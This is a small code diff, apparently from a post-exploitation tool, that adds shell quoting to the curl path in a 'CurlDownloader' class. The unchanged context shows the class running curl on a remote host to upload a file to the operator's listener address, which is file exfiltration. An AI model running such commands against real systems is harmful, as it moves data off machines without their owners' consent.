@@ -15,7 +15,7 @@ class CurlDownloader(HTTPDownloader):
 
         lhost = self.pty.vars["lhost"]
         lport = self.server.server_address[1]
-        curl = self.pty.which("curl")
+        curl = self.pty.which("curl", quote=True)
         remote_path = shlex.quote(self.remote_path)
 
         self.pty.run(f"{curl} --upload-file {remote_path} http://{lhost}:{lport}")
